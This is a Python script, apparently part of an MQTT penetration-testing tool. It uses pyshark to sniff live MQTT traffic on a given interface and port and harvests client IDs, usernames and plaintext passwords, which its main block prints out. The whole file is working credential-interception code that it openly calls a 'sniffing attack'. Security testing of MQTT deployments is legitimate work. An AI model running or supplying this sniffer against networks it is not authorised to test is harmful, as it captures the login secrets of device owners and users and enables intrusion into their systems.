import pyshark
import concurrent.futures


# Try to sniff the packets, looking for credentials or client-ids.

# custom class to store a username and the related password (if found)
class Credentials:
    def __init__(self):
        # boolean flag used to check if the object is empty or not
        self.empty = True
        self.username = ''
        self.password = ''

    def add_username(self, username):
        self.empty = False
        self.username = username

    def add_password(self, password):
        self.empty = False
        self.password = password

credentials = {}
clientids = []
num_packets = 0

# utility function to convert the message type number in a more human-readable form
def convert_msg_type(msg_type):
    if msg_type == 1:
        return "CONNECT"
    elif msg_type == 2:
        return "CONNACK"
    elif msg_type == 3:
        return "PUBLISH"
    elif msg_type == 4:
        return "PUBACK"
    elif msg_type == 5:
        return "PUBREQ"
    elif msg_type == 6:
        return "PUBREL"
    elif msg_type == 7:
        return "PUBCOMP"
    elif msg_type == 8:
        return "SUBSCRIBE"
    elif msg_type == 9:
        return "SUBACK"
    elif msg_type == 10:
        return "UNSUBSCRIBE"
    elif msg_type == 11:
        return "UNSUBACK"
    elif msg_type == 12:
        return "PINGREQ"
    elif msg_type == 13:
        return "PINGRESP"
    elif msg_type == 14:
        return "DISCONNECT"

# used for testing purposes to print specific parameters values for all the messages found in the communication
def print_info(pkt):
    global credentials
    global clientids
    global num_packets

    credential = Credentials()
    print(pkt['mqtt'].pretty_print())
    num_packets+=1
    try:
        print("Client ID: "+pkt['mqtt'].clientid)
        clientids.append(pkt['mqtt'].clientid)
    except:
        print("No client id in the request")
    try:
        print("Username: "+pkt['mqtt'].username)
        credential.add_username(pkt['mqtt'].username)
    except:
        print("No username in the request")
    try:
        print("Password: "+pkt['mqtt'].passwd)
        credential.add_password(pkt['mqtt'].passwd)
    except:
        print("No password in the request")
    try:
        print("Message: "+pkt['mqtt'].msg)
    except:
        print("No message in the request")
    try:
        print("Topic: "+pkt['mqtt'].topic)
    except:
        print("No topic in the request")
    try:
        print("Msg type: "+convert_msg_type(int(pkt['mqtt'].msgtype)))
    except:
        print("No msg type in the request")
    if credential.empty == False:
        credentials[credential.username] = credential

# actual function called if an MQTT packet is intercepted
def get_info(pkt):
    global credentials
    global clientids
    global num_packets

    credential = Credentials()
    num_packets+=1
    # try to get the client-id from the intercepted message
    try:
        clientids.append(pkt['mqtt'].clientid)
    except:
        pass
    # try to get the username from the intercepted message
    try:
        credential.add_username(pkt['mqtt'].username)
    except:
        pass
    # try to get the password from the intercepted message
    try:
        credential.add_password(pkt['mqtt'].passwd)
    except:
        pass

    # check if the credential object is empty using a boolean flag
    # if it is not ->  add it to the array

    if credential.empty == False:
        credentials[credential.username] = credential


"""
Performs the sniffing attack

Parameters:
    interface (str):        network interface to sniff over for MQTT packets
    listening_time (int):   duration of the sniffing attack
Returns:
    credentials, clientids ([Credentials]), ([str]): an array of Credentials objects containing
                                                     usernames and passwords and an array of string
                                                     containing client-ids
"""
def sniffing_attack(interface, listening_time, port):
    global usernames
    global passwords
    global clientids
    global num_packets
    # use pyshark to sniff over the specified interface
    # specify that we want to listen only for MQTT packets
    cap = pyshark.LiveCapture(interface=interface, display_filter='mqtt', decode_as={"tcp.port=="+str(port)+"": "mqtt"})
    try:
        # when an MQTT packet is intercepted call the function get_info
        # and define the timeout of the attack
        cap.apply_on_packets(get_info, timeout=float(listening_time))

    except concurrent.futures.TimeoutError:
        print("Sniffing terminated: "+str(num_packets)+" packets intercepted on "+interface)
        pass
    except Exception as e:
        template = "An exception of type {0} occurred during Sniffing. Arguments:\n{1!r}"
        message = template.format(type(e).__name__, e.args)
        print(message)
        return credentials.values(), set(clientids)
    return credentials.values(), set(clientids)

# used for running only this attack for testing purposes
if __name__=="__main__":
    inf=input("Enter interface to sniff:")
    time=input("Enter number of seconds to sniff:")
    port=input("Enter the port (correctly decode MQTT messages):")
    cap = pyshark.LiveCapture(interface=inf, display_filter='mqtt', decode_as={"tcp.port=="+str(port)+"": "mqtt"})
    try:
        cap.apply_on_packets(print_info, timeout=float(time))
    except concurrent.futures.TimeoutError:
        print("\nSniffing terminated: "+str(num_packets)+" packets intercepted on "+inf)
        i = 1
        for cred in credentials.values():
            print("Credential"+"["+str(i)+"]: "+cred.username+" : "+cred.password)
            i+=1
        i = 1
        for id in set(clientids):
            print("ClientID"+"["+str(i)+"]: "+id)
            i+=1
    except Exception as e:
        template = "An exception of type {0} occurred during Sniffing. Arguments:\n{1!r}"
        message = template.format(type(e).__name__, e.args)
        print(message)
